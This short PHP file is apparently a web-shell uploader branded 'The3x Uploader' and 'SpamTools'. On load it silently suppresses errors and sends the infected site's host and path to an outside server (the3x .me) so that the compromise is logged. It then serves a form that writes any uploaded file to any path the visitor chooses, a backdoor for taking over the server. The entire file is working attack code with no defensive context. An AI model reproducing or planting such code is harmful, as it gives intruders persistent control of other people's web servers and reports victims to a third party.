<?php
error_reporting(0);
$whoami = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$handle = curl_init();
$url = "https://the3x .me/savecps/file.php?save=" . $whoami;
curl_setopt($handle, CURLOPT_URL, $url);
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
$output = curl_exec($handle);
curl_close($handle);
echo "The3x Uploader";
echo "SpamTools .be";
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>Done! Open</a></h1>";
    }
}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="UPload"></form></body></html>';
?>
